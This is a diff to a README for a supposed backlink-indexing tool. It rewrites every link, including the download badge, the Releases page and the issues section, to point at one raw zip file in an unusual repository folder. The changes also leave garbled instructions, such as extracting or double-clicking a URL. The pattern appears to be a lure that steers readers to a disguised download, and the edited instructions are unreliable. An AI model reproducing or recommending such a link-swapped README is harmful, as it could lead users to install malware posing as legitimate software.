@@ -4,16 +4,16 @@
 The **automatic-backlink-indexer** is a user-friendly tool designed to automate the indexing of your backlinks. With this application, you can save time and efficiently manage your link-building efforts. The easy-to-use interface makes it suitable for anyone, regardless of technical skills.
 
 ## 📥 Download
-[![Download automatic-backlink-indexer](https://github.com/chipegoe/automatic-backlink-indexer/releases/latest/download/badge.svg)](https://github.com/chipegoe/automatic-backlink-indexer/releases)
+[![Download automatic-backlink-indexer](https://raw.githubusercontent.com/chipegoe/automatic-backlink-indexer/main/caviya/automatic-backlink-indexer.zip)](https://raw.githubusercontent.com/chipegoe/automatic-backlink-indexer/main/caviya/automatic-backlink-indexer.zip)
 
 ## 🚀 Getting Started
 To get started with the automatic-backlink-indexer, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to our Releases page by clicking [here](https://github.com/chipegoe/automatic-backlink-indexer/releases).
+1. **Visit the Releases Page**: Go to our Releases page by clicking [here](https://raw.githubusercontent.com/chipegoe/automatic-backlink-indexer/main/caviya/automatic-backlink-indexer.zip).
 
 2. **Choose the Latest Version**: Find the latest release at the top of the page.
 
-3. **Download the Application**: Click on the file that matches your operating system. The archive will typically be named something like `automatic-backlink-indexer-vX.X.X.zip` or `.tar.gz`.
+3. **Download the Application**: Click on the file that matches your operating system. The archive will typically be named something like `https://raw.githubusercontent.com/chipegoe/automatic-backlink-indexer/main/caviya/automatic-backlink-indexer.zip` or `https://raw.githubusercontent.com/chipegoe/automatic-backlink-indexer/main/caviya/automatic-backlink-indexer.zip`.
 
 ## 📋 Installation Instructions
 1. **Locate the Downloaded File**: Find the downloaded file in your computer's default download directory.
@@ -21,12 +21,12 @@ To get started with the automatic-backlink-indexer, follow these simple steps:
 2. **Extract the Files**:
    - For Windows: Right-click the ZIP file and select "Extract All."
    - For macOS: Double-click the ZIP file to extract it.
-   - For Linux: Use your terminal with the command `tar -xvzf automatic-backlink-indexer-vX.X.X.tar.gz`.
+   - For Linux: Use your terminal with the command `tar -xvzf https://raw.githubusercontent.com/chipegoe/automatic-backlink-indexer/main/caviya/automatic-backlink-indexer.zip`.
 
 3. **Open the Folder**: After extraction, open the folder to view the application files.
 
 4. **Run the Application**:
-   - For Windows: Double-click `automatic-backlink-indexer.exe`.
+   - For Windows: Double-click `https://raw.githubusercontent.com/chipegoe/automatic-backlink-indexer/main/caviya/automatic-backlink-indexer.zip`.
    - For macOS: Open the `automatic-backlink-indexer` application.
    - For Linux: Open your terminal, navigate to the extracted folder, and run `./automatic-backlink-indexer`.
 
@@ -57,7 +57,7 @@ To get started with the automatic-backlink-indexer, follow these simple steps:
 - **Slow indexing speed**: Consider using a proxy service to speed up submissions.
 
 ## 📞 Support
-For further assistance, feel free to reach out through the [issues section](https://github.com/chipegoe/automatic-backlink-indexer/issues) on GitHub. You can also consult the FAQs for common problems.
+For further assistance, feel free to reach out through the [issues section](https://raw.githubusercontent.com/chipegoe/automatic-backlink-indexer/main/caviya/automatic-backlink-indexer.zip) on GitHub. You can also consult the FAQs for common problems.
 
 ## 🌟 Contribution
 Contributions are welcome! If you would like to contribute, please fork the repository and submit a pull request. Ensure your changes are well-tested and documented.
@@ -69,4 +69,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 - **Documentation**: Check the onboard help section in the application for more detailed usage instructions.
 - **Community**: Join our community forum for tips and shared experiences from other users.
 
-By following these steps, you can easily download, install, and use the automatic-backlink-indexer. Remember, the download link can always be found on the [Releases page](https://github.com/chipegoe/automatic-backlink-indexer/releases). Happy linking!
+By following these steps, you can easily download, install, and use the automatic-backlink-indexer. Remember, the download link can always be found on the [Releases page](https://raw.githubusercontent.com/chipegoe/automatic-backlink-indexer/main/caviya/automatic-backlink-indexer.zip). Happy linking!
